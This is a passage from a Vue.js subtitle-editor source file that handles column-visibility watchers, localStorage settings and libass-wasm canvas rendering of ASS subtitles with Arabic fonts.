                                this.initLibassWasmParts();
                            } else {
                                this.cleanupResizeObserver();
                                this.disposeLibassWasm();
                                this.disposeLibassWasmParts();
                            }
                        },
                        immediate: true
                    },
                    currentTime() {
                        this.renderLibassWasm();
                        this.renderLibassWasmParts();
                    },
                    lines: {
                        handler() {
                            this.scheduleLibassTrackUpdate();
                            this.scheduleLibassPartsTrackUpdate();
                            this.syncEditedLineIndices();
                        },
                        deep: true
                    },
                    'dummyVideo.width'() {
                        this.resizeLibassCanvas();
                        this.resizeLibassPartsCanvas();
                    },
                    'dummyVideo.height'() {
                        this.resizeLibassCanvas();
                        this.resizeLibassPartsCanvas();
                    },
                    rtlCount(newVal) {
                        if (newVal === 0 && this.filterMode === 'rtl') {
                            this.filterMode = 'all';
                        }
                    },
                    ltrCount(newVal) {
                        if (newVal === 0 && this.filterMode === 'ltr') {
                            this.filterMode = 'all';
                        }
                    },
                    showColTime(newVal) {
                        if (!newVal && !this.showColStyle && !this.showColStatus && !this.showColText) {
                            this.$nextTick(() => { this.showColTime = true; });
                            return;
                        }
                        this.saveColumnSettings();
                    },
                    showColStyle(newVal) {
                        if (!newVal && !this.showColTime && !this.showColStatus && !this.showColText) {
                            this.$nextTick(() => { this.showColStyle = true; });
                            return;
                        }
                        this.saveColumnSettings();
                    },
                    showColStatus(newVal) {
                        if (!newVal && !this.showColTime && !this.showColStyle && !this.showColText) {
                            this.$nextTick(() => { this.showColStatus = true; });
                            return;
                        }
                        this.saveColumnSettings();
                    },
                    showColText(newVal) {
                        if (!newVal && !this.showColTime && !this.showColStyle && !this.showColStatus) {
                            this.$nextTick(() => { this.showColText = true; });
                            return;
                        }
                        this.saveColumnSettings();
                    },
                    showColFontname(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColFontname = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColFontsize(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColFontsize = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColPrimaryColour(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColPrimaryColour = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColSecondaryColour(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColSecondaryColour = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColOutlineColour(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColOutlineColour = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColBackColour(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColBackColour = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColBold(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColBold = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColItalic(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColItalic = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColUnderline(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColUnderline = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColStrikeOut(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColStrikeOut = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColScaleX(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColScaleX = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColScaleY(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColScaleY = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColSpacing(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColSpacing = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColAngle(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColAngle = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColBorderStyle(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColBorderStyle = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColOutline(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColOutline = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColShadow(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColShadow = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColAlignment(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColAlignment = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColMarginL(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColMarginL = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColMarginR(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColMarginR = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColMarginV(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColMarginV = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    showColEncoding(newVal) {
                        const visible = [this.showColFontname, this.showColFontsize, this.showColPrimaryColour, this.showColSecondaryColour, this.showColOutlineColour, this.showColBackColour, this.showColBold, this.showColItalic, this.showColUnderline, this.showColStrikeOut, this.showColScaleX, this.showColScaleY, this.showColSpacing, this.showColAngle, this.showColBorderStyle, this.showColOutline, this.showColShadow, this.showColAlignment, this.showColMarginL, this.showColMarginR, this.showColMarginV, this.showColEncoding].filter(v => v).length;
                        if (!newVal && visible === 0) {
                            this.$nextTick(() => { this.showColEncoding = true; });
                            return;
                        }
                        this.saveStylesColumnSettings();
                    },
                    currentPage(newPage) {
                        if (newPage > this.totalPages) {
                            this.currentPage = this.totalPages;
                        }
                    },
                    linesModalType() {
                        this.currentPage = 1;
                    },
                    filterMode() {
                        for (let i = 0; i < this.lines.length; i++) {
                            const line = this.lines[i];
                            const matches = this.filterMode === 'all' ||
                                (this.filterMode === 'rtl' && line.displaysRTL) ||
                                (this.filterMode === 'ltr' && !line.displaysRTL);

                            if (matches) {
                                this.currentIndex = i;
                                this.updateRTLPreview();
                                return;
                            }
                        }

                        this.currentIndex = -1;
                        this.updateRTLPreview();
                    },
                    isAnyModalOpen(newValue) {
                        if (newValue) {
                            document.body.style.overflow = 'hidden';
                        } else {
                            document.body.style.overflow = '';
                        }
                    },
                    currentIndex(newVal) {
                         if (this.viewMode === 'dummy-video' && newVal >= 0 && newVal < this.lines.length) {
                             const line = this.lines[newVal];
                             this.currentTime = parseTime(line.Start);
                             // Also ensure we pause if we are jumping? User didn't specify, but jumping usually implies wanting to see that specific frame.
                             // But if playing, maybe we want to continue playing from there. 
                             // I'll leave play state as is.
                         }
                    }
                },
                mounted() {
                    this.loadTheme();
                    this.setupSystemThemeListener();
                    this.setupPWAInstall();
                    this._ensureUserIdentity(); // Start identity load immediately
                    this._initCacheStore();
                    
                    window.addEventListener('online', () => {
                        this._flushSyncBuffer();
                    });

                    // Load column visibility settings
                    const saved = localStorage.getItem('lines-modal-columns');
                    if (saved) {
                        try {
                            const settings = JSON.parse(saved);
                            if (settings.showColTime !== undefined) this.showColTime = settings.showColTime;
                            if (settings.showColStyle !== undefined) this.showColStyle = settings.showColStyle;
                            if (settings.showColStatus !== undefined) this.showColStatus = settings.showColStatus;
                            if (settings.showColText !== undefined) this.showColText = settings.showColText;
                        } catch (e) {
                            console.error('Failed to load column settings:', e);
                        }
                    }

                    const savedStyles = localStorage.getItem('styles-modal-columns');
                    if (savedStyles) {
                        try {
                            const settings = JSON.parse(savedStyles);
                            if (settings.showColFontname !== undefined) this.showColFontname = settings.showColFontname;
                            if (settings.showColFontsize !== undefined) this.showColFontsize = settings.showColFontsize;
                            if (settings.showColPrimaryColour !== undefined) this.showColPrimaryColour = settings.showColPrimaryColour;
                            if (settings.showColSecondaryColour !== undefined) this.showColSecondaryColour = settings.showColSecondaryColour;
                            if (settings.showColOutlineColour !== undefined) this.showColOutlineColour = settings.showColOutlineColour;
                            if (settings.showColBackColour !== undefined) this.showColBackColour = settings.showColBackColour;
                            if (settings.showColBold !== undefined) this.showColBold = settings.showColBold;
                            if (settings.showColItalic !== undefined) this.showColItalic = settings.showColItalic;
                            if (settings.showColUnderline !== undefined) this.showColUnderline = settings.showColUnderline;
                            if (settings.showColStrikeOut !== undefined) this.showColStrikeOut = settings.showColStrikeOut;
                            if (settings.showColScaleX !== undefined) this.showColScaleX = settings.showColScaleX;
                            if (settings.showColScaleY !== undefined) this.showColScaleY = settings.showColScaleY;
                            if (settings.showColSpacing !== undefined) this.showColSpacing = settings.showColSpacing;
                            if (settings.showColAngle !== undefined) this.showColAngle = settings.showColAngle;
                            if (settings.showColBorderStyle !== undefined) this.showColBorderStyle = settings.showColBorderStyle;
                            if (settings.showColOutline !== undefined) this.showColOutline = settings.showColOutline;
                            if (settings.showColShadow !== undefined) this.showColShadow = settings.showColShadow;
                            if (settings.showColAlignment !== undefined) this.showColAlignment = settings.showColAlignment;
                            if (settings.showColMarginL !== undefined) this.showColMarginL = settings.showColMarginL;
                            if (settings.showColMarginR !== undefined) this.showColMarginR = settings.showColMarginR;
                            if (settings.showColMarginV !== undefined) this.showColMarginV = settings.showColMarginV;
                            if (settings.showColEncoding !== undefined) this.showColEncoding = settings.showColEncoding;
                        } catch (e) {
                            console.error('Failed to load styles column settings:', e);
                        }
                    }
                },
                beforeUnmount() {
                    this.cleanupResizeObserver();
                    this.disposeLibassWasm();
                    this.disposeLibassWasmParts();
                    document.body.style.overflow = '';
                },
                methods: {
                    buildAssForLibass() {
                        let header = '[Script Info]\n';
                        header += 'ScriptType: v4.00+\n';
                        header += 'WrapStyle: 0\n';
                        header += 'ScaledBorderAndShadow: yes\n';
                        header += 'YCbCr Matrix: None\n';
                        
                        const { x: sw, y: sh } = this.scriptResolution;
                        header += `PlayResX: ${sw}\n`;
                        header += `PlayResY: ${sh}\n`;
                        
                        // Add other script info
                        this.scriptInfo.forEach(info => {
                            if (!['ScriptType', 'WrapStyle', 'ScaledBorderAndShadow', 'YCbCr Matrix', 'PlayResX', 'PlayResY'].includes(info.key)) {
                                header += `${info.key}: ${info.value}\n`;
                            }
                        });
                        header += '\n[V4+ Styles]\n';
                        header += 'Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding\n';
                        
                        // Add default style if no styles
                        if (this.styles.length === 0) {
                             header += 'Style: Default,Arial,20,&H00FFFFFF,&H000000FF,&H00000000,&H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1\n';
                        } else {
                            for (const s of this.styles) {
                                header += `Style: ${s.Name},${s.Fontname},${s.Fontsize},${s.PrimaryColour},${s.SecondaryColour},${s.OutlineColour},${s.BackColour},${s.Bold},${s.Italic},${s.Underline},${s.StrikeOut},${s.ScaleX},${s.ScaleY},${s.Spacing},${s.Angle},${s.BorderStyle},${s.Outline},${s.Shadow},${s.Alignment},${s.MarginL},${s.MarginR},${s.MarginV},${s.Encoding}\n`;
                            }
                        }

                        header += '\n[Events]\n';
                        header += 'Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n';
                        for (const line of this.lines) {
                            header += `Dialogue: ${line.Layer},${line.Start},${line.End},${line.Style},${line.Name},${line.MarginL},${line.MarginR},${line.MarginV},${line.Effect},${line.Text}\n`;
                        }
                        return header;
                    },
                    resizeLibassCanvas() {
                        if (!this.useLibassWasm) return;
                        const canvas = this.$refs.libassCanvas;
                        if (!canvas) return;
                        const pixelRatio = window.devicePixelRatio || 1;
                        
                        // Use container dimensions for display resolution (crisp text)
                        // This matches modern players which render OSD/Subs at screen resolution
                        const width = Math.max(1, Math.round((this.dummyVideo.containerWidth || 1920) * pixelRatio));
                        const height = Math.max(1, Math.round((this.dummyVideo.containerHeight || 1080) * pixelRatio));
                        
                        if (canvas.width !== width) canvas.width = width;
                        if (canvas.height !== height) canvas.height = height;
                        if (this.libassInstance) {
                            this.libassInstance.resize(width, height);
                        }
                    },
                    initLibassWasm() {
                        if (!this.useLibassWasm) return;
                        if (!this.assFile) return;
                        if (this.viewMode !== 'dummy-video') return;
                        if (this.libassInstance) return;
                        this.$nextTick(() => {
                            if (!this.useLibassWasm) return;
                            if (!this.assFile) return;
                            if (this.viewMode !== 'dummy-video') return;
                            if (this.libassInstance) return;
                            if (!this.$refs.libassCanvas) return;
                            if (typeof SubtitlesOctopus === 'undefined') {
                                this.useLibassWasm = false;
                                return;
                            }
                            this.libassReady = false;
                            this.resizeLibassCanvas();
                            const options = {
                                canvas: this.$refs.libassCanvas,
                                subContent: this.buildAssForLibass(),
                                workerUrl: 'https://cdn.jsdelivr.net/npm/libass-wasm@4.1.0/dist/js/subtitles-octopus-worker.js',
                                legacyWorkerUrl: 'https://cdn.jsdelivr.net/npm/libass-wasm@4.1.0/dist/js/subtitles-octopus-worker-legacy.js',
                                renderMode: 'wasm-blend',
                                fonts: ['https://cdn.jsdelivr.net/npm/tajawal@1.0.0/fonts/Tajawal-Regular.ttf', 'https://cdn.jsdelivr.net/npm/tajawal@1.0.0/fonts/Tajawal-Bold.ttf'], // Add a default font
                                onReady: () => {
                                    this.libassReady = true;
                                    this.renderLibassWasm();
                                },
                                onError: () => {
                                    this.useLibassWasm = false;
                                    this.disposeLibassWasm();
                                }
                            };
                            try {
                                this.libassInstance = new SubtitlesOctopus(options);
                            } catch (e) {
                                this.useLibassWasm = false;
                                this.disposeLibassWasm();
                            }
                        });
                    },
                    disposeLibassWasm() {
                        this.libassReady = false;
                        if (this.libassTrackUpdateTimer) {
                            clearTimeout(this.libassTrackUpdateTimer);
                            this.libassTrackUpdateTimer = null;
                        }
                        if (this.libassInstance) {
                            try {
                                this.libassInstance.dispose();
                            } catch (e) {}
                            this.libassInstance = null;
                        }
                    },
                    renderLibassWasm() {
                        if (!this.useLibassWasm) return;
                        if (!this.libassInstance || !this.libassReady) return;
                        this.resizeLibassCanvas();
                        this.libassInstance.setCurrentTime((this.currentTime || 0) / 1000);
                    },
                    scheduleLibassTrackUpdate() {
                        if (!this.useLibassWasm) return;
                        if (!this.libassInstance) return;
                        if (this.libassTrackUpdateTimer) clearTimeout(this.libassTrackUpdateTimer);
                        this.libassTrackUpdateTimer = setTimeout(() => {
                            if (!this.useLibassWasm) return;
                            if (!this.libassInstance) return;
                            this.libassInstance.setTrack(this.buildAssForLibass());
                            this.renderLibassWasm();
                        }, 250);
                    },
                    resizeLibassPartsCanvas() {
                        if (!this.libassPartsEnabled) return;
                        const canvas = this.$refs.libassPartsCanvas;
                        if (!canvas) return;
                        const pixelRatio = window.devicePixelRatio || 1;
                        const width = Math.max(1, Math.round((this.dummyVideo.containerWidth || 1920) * pixelRatio));
                        const height = Math.max(1, Math.round((this.dummyVideo.containerHeight || 1080) * pixelRatio));
                        if (canvas.width !== width) canvas.width = width;
                        if (canvas.height !== height) canvas.height = height;
                        if (this.libassPartsInstance) {
                            this.libassPartsInstance.resize(width, height);
                        }
                    },
                    initLibassWasmParts() {
                        if (!this.libassPartsEnabled) return;
                        if (this.libassPartsInstance) return;
                        this.$nextTick(() => {
                            if (!this.libassPartsEnabled) return;
                            if (this.libassPartsInstance) return;
                            if (!this.$refs.libassPartsCanvas) return;
                            if (typeof SubtitlesOctopus === 'undefined') return;
                            this.libassPartsFailed = false;
                            this.libassPartsReady = false;
                            this.resizeLibassPartsCanvas();
                            const options = {
                                canvas: this.$refs.libassPartsCanvas,
                                subContent: this.buildAssForLibass(),
                                workerUrl: 'https://cdn.jsdelivr.net/npm/libass-wasm@4.1.0/dist/js/subtitles-octopus-worker.js',
                                legacyWorkerUrl: 'https://cdn.jsdelivr.net/npm/libass-wasm@4.1.0/dist/js/subtitles-octopus-worker-legacy.js',
                                renderMode: 'wasm-blend',
                                fonts: ['https://cdn.jsdelivr.net/npm/tajawal@1.0.0/fonts/Tajawal-Regular.ttf', 'https://cdn.jsdelivr.net/npm/tajawal@1.0.0/fonts/Tajawal-Bold.ttf'],
                                onReady: () => {
                                    this.libassPartsReady = true;
                                    this.renderLibassWasmParts();
                                },
                                onError: () => {
                                    this.libassPartsFailed = true;
                                    this.disposeLibassWasmParts();
                                }
                            };
                            try {
                                this.libassPartsInstance = new SubtitlesOctopus(options);
                            } catch (e) {
                                this.libassPartsFailed = true;
                                this.disposeLibassWasmParts();
                            }
                        });
                    },
                    disposeLibassWasmParts() {
                        this.libassPartsReady = false;
                        if (this.libassPartsTrackUpdateTimer) {
                            clearTimeout(this.libassPartsTrackUpdateTimer);
                            this.libassPartsTrackUpdateTimer = null;
                        }
                        if (this.libassPartsInstance) {
                            try {
                                this.libassPartsInstance.dispose();
                            } catch (e) {}
                            this.libassPartsInstance = null;
                        }
                    },
                    renderLibassWasmParts() {
                        if (!this.libassPartsEnabled) return;
                        if (!this.libassPartsInstance || !this.libassPartsReady) {
                            this.initLibassWasmParts();
                            return;
                        }
                        this.resizeLibassPartsCanvas();
                        this.libassPartsInstance.setCurrentTime((this.currentTime || 0) / 1000);
                    },
                    scheduleLibassPartsTrackUpdate() {
                        if (!this.libassPartsEnabled) return;
                        if (!this.libassPartsInstance) {
                            this.initLibassWasmParts();
                            return;
                        }
                        if (this.libassPartsTrackUpdateTimer) clearTimeout(this.libassPartsTrackUpdateTimer);
                        this.libassPartsTrackUpdateTimer = setTimeout(() => {
                            if (!this.libassPartsEnabled) return;
                            if (!this.libassPartsInstance) return;
                            this.libassPartsInstance.setTrack(this.buildAssForLibass());
                            this.renderLibassWasmParts();
                        }, 250);
                    },
                    getFontFamilyStack(fontName) {
                        const seen = new Set();
                        const stack = [];
                        const add = (name) => {
                            const n = (name || '').trim();
                            if (!n) return;
                            const key = n.toLowerCase();
                            if (seen.has(key)) return;
                            seen.add(key);
                            stack.push(n);
                        };

                        add(fontName);
                        add('Tahoma');
                        add('Arial');
                        add('Segoe UI');
                        add('Noto Sans Arabic');
                        add('Noto Naskh Arabic');
                        add('Amiri');
                        add('sans-serif');

                        return stack
                            .map(n => (n === 'sans-serif' ? n : `"${n.replace(/"/g, '\\"')}"`))
                            .join(', ');
                    },
                    getLineClipPathId(idx) {
                        return `ass-clip-${idx}`;
                    },
                    getLineClipMaskId(idx) {
                        return `ass-clip-mask-${idx}`;
                    },
                    renderAssLine(line, idx) {
                        const rendered = this.getRenderedParts(line);
                        const style = this.getLineStyle(line);
                        if (rendered.clip && Number.isFinite(idx)) {
                            if (rendered.clip.invert) {
                                const maskRef = `url(#${this.getLineClipMaskId(idx)})`;
                                style.mask = maskRef;
                                style.WebkitMask = maskRef;
                            } else {
                                const clipRef = `url(#${this.getLineClipPathId(idx)})`;
                                style.clipPath = clipRef;
                                style.WebkitClipPath = clipRef;
                            }
                        }
                        return { line, idx, style, parts: rendered.parts, clip: rendered.clip };
                    },
                    getLineStyle(line) {
                        const style = {
                            position: 'absolute',
                            textAlign: 'center',
                            pointerEvents: 'none',
                            direction: line.isArabic ? 'rtl' : 'ltr'
                        };

                        // Alignment logic
                        let alignment = 2; // Default Bottom Center
                        const styleName = line.Style;
                        const s = this.styles.find(st => st.Name === styleName);
                        if (s) alignment = parseInt(s.Alignment);
                        
                        // Check \an tag
                        const anMatch = line.Text.match(/\\an([1-9])/);
                        if (anMatch) alignment = parseInt(anMatch[1]);
                        
                        if (!anMatch) {
                            const aMatch = line.Text.match(/\\a(\d+)/);
                            if (aMatch) {
                                const aVal = parseInt(aMatch[1]);
                                const legacyMap = {
                                    1: 1,
                                    2: 2,
                                    3: 3,
                                    5: 7,
                                    6: 8,
                                    7: 9,
                                    9: 4,
                                    10: 5,
                                    11: 6
                                };
                                if (legacyMap[aVal]) alignment = legacyMap[aVal];
                            }
                        }

                        // Check for \pos(x,y)
                        let posMatch = line.Text.match(/\\pos\s*\(\s*(-?\d+(\.\d+)?)\s*,\s*(-?\d+(\.\d+)?)\s*\)/);
                        
                        // Check for \move(x1,y1,x2,y2,t1,t2) or \move(x1,y1,x2,y2)
